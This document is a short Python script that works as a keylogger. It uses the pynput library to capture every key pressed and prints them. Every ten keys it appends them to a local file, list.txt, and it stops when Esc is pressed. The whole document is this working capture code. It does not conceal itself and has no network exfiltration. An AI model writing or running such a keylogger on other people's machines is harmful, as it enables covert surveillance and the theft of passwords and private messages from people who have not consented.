import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
	global keys, count

	keys.append(key)
	count += 1
	print("{0} pressed".format(key))
	print(keys)

	if count == 10:
		write_file(keys)
		count = 0
		keys = []

def on_release(key):
	if key == Key.esc:
		return False

def write_file(keys):
	with open('list.txt', 'a') as f:
		for key in keys:
			k = str(key).replace("'", "")
			if k.find("space") > 0:
				f.write(' ')

			elif k.find("Key") == -1:
				f.write(k)

			elif k.find("enter") > 0:
				f.write('\n')

with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()
